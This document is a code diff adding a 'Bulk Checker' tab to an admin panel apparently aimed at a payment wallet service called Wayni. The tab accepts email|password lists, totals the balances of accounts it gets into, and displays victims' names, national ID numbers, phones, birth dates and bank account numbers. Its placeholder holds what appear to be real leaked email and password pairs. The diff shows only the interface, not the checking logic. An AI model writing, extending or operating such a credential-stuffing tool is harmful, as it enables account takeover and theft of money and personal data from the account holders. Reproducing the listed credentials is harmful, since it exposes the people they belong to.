@@ -844,6 +844,165 @@ const WayniAdmin = () => {
             </div>
           )}
 
+          {/* ═══ BULK CHECKER TAB ═══ */}
+          {activeTab === "bulk" && (
+            <div className="space-y-4">
+              <div className="bg-[#111] border border-[#1a1a1a] rounded-xl overflow-hidden">
+                <div className="px-4 py-3 border-b border-[#1a1a1a] flex items-center justify-between">
+                  <div className="flex items-center gap-2">
+                    <Zap className="w-4 h-4 text-[#c8e64a]" />
+                    <span className="text-sm font-semibold text-white">Bulk Checker</span>
+                    <span className="text-gray-500 text-xs">{parseBulkInput(bulkInput).length} contas</span>
+                  </div>
+                </div>
+                <div className="p-4">
+                  <textarea
+                    value={bulkInput}
+                    onChange={e => setBulkInput(e.target.value)}
+                    placeholder={"cejasricardo58@gmail.com|15419853s\ncele_rene1@hotmail.com|arianagrande1\nemail@exemplo.com|senha123"}
+                    rows={6}
+                    className="w-full bg-[#0a0a0a] border border-[#222] rounded-lg p-3 text-white text-[13px] font-mono placeholder:text-gray-600 focus:outline-none focus:border-[#c8e64a] resize-y transition-colors"
+                  />
+                </div>
+                <div className="px-4 pb-4 flex items-center justify-between">
+                  <span className="text-gray-500 text-[11px]">Formato: <code className="text-[#c8e64a]/60 bg-[#c8e64a]/5 px-1 py-0.5 rounded">email|senha</code></span>
+                  <div className="flex gap-2">
+                    {bulkLoading && (
+                      <button
+                        onClick={() => { setBulkPaused(!bulkPaused); bulkPausedRef.current = !bulkPausedRef.current; }}
+                        className={`px-3 py-1.5 text-xs font-medium rounded-lg ${bulkPaused ? "text-green-400 bg-green-500/10" : "text-amber-400 bg-amber-500/10"}`}
+                      >
+                        {bulkPaused ? <><Play className="w-3.5 h-3.5 inline mr-1" />Retomar</> : <><Pause className="w-3.5 h-3.5 inline mr-1" />Pausar</>}
+                      </button>
+                    )}
+                    <button
+                      onClick={handleBulkCheck}
+                      disabled={bulkLoading || !parseBulkInput(bulkInput).length}
+                      className="px-5 py-1.5 bg-[#c8e64a] text-[#0a0a0a] font-bold text-xs rounded-lg disabled:opacity-50 hover:bg-[#d4f058] transition-colors flex items-center gap-1.5"
+                    >
+                      {bulkLoading ? (
+                        <><Loader2 className="animate-spin w-3.5 h-3.5" />{bulkProgress.total > 0 ? `${bulkProgress.done}/${bulkProgress.total}` : "..."}</>
+                      ) : (
+                        <><Zap className="w-3.5 h-3.5" />Iniciar</>
+                      )}
+                    </button>
+                  </div>
+                </div>
+                {bulkLoading && bulkProgress.total > 0 && (
+                  <div className="px-4 pb-3">
+                    <div className="w-full bg-[#222] rounded-full h-1 overflow-hidden">
+                      <div className="h-full bg-[#c8e64a] transition-all duration-700" style={{ width: `${(bulkProgress.done / bulkProgress.total) * 100}%` }} />
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              {bulkResults.length > 0 && (
+                <>
+                  {/* Metrics */}
+                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
+                    <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-3 text-center">
+                      <p className="text-[9px] text-gray-500 uppercase mb-1">Sucesso</p>
+                      <p className="text-lg font-mono font-bold text-green-400">{bulkResults.filter(r => r.success).length}/{bulkResults.length}</p>
+                    </div>
+                    <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-3 text-center">
+                      <p className="text-[9px] text-gray-500 uppercase mb-1">Falha</p>
+                      <p className="text-lg font-mono font-bold text-red-400">{bulkResults.filter(r => !r.success).length}</p>
+                    </div>
+                    <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-3 text-center">
+                      <p className="text-[9px] text-gray-500 uppercase mb-1">Saldo Total</p>
+                      <p className="text-lg font-mono font-bold text-[#c8e64a]">${bulkResults.filter(r => r.success).reduce((s, r) => s + parseFloat(r.balance || "0"), 0).toLocaleString("es-AR", { minimumFractionDigits: 2 })}</p>
+                    </div>
+                    <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-3 text-center">
+                      <p className="text-[9px] text-gray-500 uppercase mb-1">Salvos</p>
+                      <p className="text-lg font-mono font-bold text-blue-400">{bulkResults.filter(r => r.saved).length}</p>
+                    </div>
+                  </div>
+
+                  {/* Results list */}
+                  <div className="space-y-1">
+                    {bulkResults.map((r, i) => {
+                      const isExpanded = bulkExpandedIdx === i;
+                      const bal = parseFloat(r.balance || "0");
+                      const bankAccounts = r.bank_data?.internal_account || [];
+                      const cvu = bankAccounts[0]?.cvu;
+                      const cvuAlias = bankAccounts[0]?.cvu_alias;
+                      const walletAccount = bankAccounts[0]?.wallet_account;
+
+                      return (
+                        <div key={r.identification + i} className={`bg-[#111] border rounded-xl overflow-hidden ${r.success ? "border-[#1a1a1a]" : "border-red-500/20 bg-red-500/5"}`}>
+                          <div
+                            className="px-3 py-2 text-xs flex items-center gap-3 cursor-pointer hover:bg-[#141414] transition-colors"
+                            onClick={() => r.success && setBulkExpandedIdx(isExpanded ? null : i)}
+                          >
+                            <span className="text-gray-600 font-mono w-6">{i + 1}</span>
+                            <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded ${r.success ? "bg-green-500/10 text-green-400" : "bg-red-500/10 text-red-400"}`}>
+                              {r.success ? "✓" : "✕"}
+                            </span>
+                            <span className="font-mono text-white truncate flex-1" style={{ minWidth: 0 }}>{r.identification}</span>
+                            {r.success && r.full_name && (
+                              <span className="text-gray-500 text-[10px] truncate max-w-[120px]">{r.full_name}</span>
+                            )}
+                            {r.success ? (
+                              <>
+                                <span className="text-[#c8e64a] font-mono whitespace-nowrap font-bold">${bal.toLocaleString("es-AR", { minimumFractionDigits: 2 })}</span>
+                                {r.saved && <span className="text-[9px] px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-400">Salvo</span>}
+                                <ChevronDown className={`w-3.5 h-3.5 text-gray-500 transition-transform ${isExpanded ? "rotate-180" : ""}`} />
+                              </>
+                            ) : (
+                              <span className="text-red-400 text-[10px]">{r.error}</span>
+                            )}
+                          </div>
+
+                          {isExpanded && r.success && (
+                            <div className="px-4 pb-3 pt-1 border-t border-[#1a1a1a] space-y-3">
+                              <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-6 gap-y-1">
+                                {r.full_name && <BulkDataItem label="Nome" value={r.full_name} />}
+                                {r.email && <BulkDataItem label="Email" value={r.email} />}
+                                {r.phone && <BulkDataItem label="Telefone" value={r.phone} />}
+                                <BulkDataItem label="DNI" value={r.identification} />
+                                <BulkDataItem label="Saldo" value={`$${bal.toLocaleString("es-AR", { minimumFractionDigits: 2 })}`} color="text-[#c8e64a]" />
+                                {r.user_uuid && <BulkDataItem label="UUID" value={r.user_uuid} />}
+                              </div>
+
+                              {/* Bank data */}
+                              {bankAccounts.length > 0 && (
+                                <div>
+                                  <p className="text-[10px] text-gray-500 font-semibold uppercase tracking-wider mb-1">Dados Bancários</p>
+                                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-6 gap-y-1">
+                                    {cvu && <BulkDataItem label="CVU" value={cvu} />}
+                                    {cvuAlias && <BulkDataItem label="Alias CVU" value={cvuAlias} />}
+                                    {walletAccount && <BulkDataItem label="Wallet" value={walletAccount} />}
+                                    {bankAccounts[0]?.entity_name && <BulkDataItem label="Banco" value={bankAccounts[0].entity_name} />}
+                                    {bankAccounts[0]?.cbu && <BulkDataItem label="CBU" value={bankAccounts[0].cbu} />}
+                                  </div>
+                                </div>
+                              )}
+
+                              {/* Profile raw data */}
+                              {r.profile?.profile && (
+                                <div>
+                                  <p className="text-[10px] text-gray-500 font-semibold uppercase tracking-wider mb-1">Perfil</p>
+                                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-6 gap-y-1">
+                                    {r.profile.profile.city && <BulkDataItem label="Cidade" value={r.profile.profile.city} />}
+                                    {r.profile.profile.province?.name && <BulkDataItem label="Província" value={r.profile.profile.province.name} />}
+                                    {r.profile.profile.country && <BulkDataItem label="País" value={r.profile.profile.country} />}
+                                    {r.profile.profile.birth_date && <BulkDataItem label="Nascimento" value={r.profile.profile.birth_date} />}
+                                    {r.profile.profile.gender && <BulkDataItem label="Gênero" value={r.profile.profile.gender} />}
+                                  </div>
+                                </div>
+                              )}
+                            </div>
+                          )}
+                        </div>
+                      );
+                    })}
+                  </div>
+                </>
+              )}
+            </div>
+          )}
+
           {/* ═══ SESSIONS / LOGS TAB ═══ */}
           {activeTab === "logs" && (
             <div>
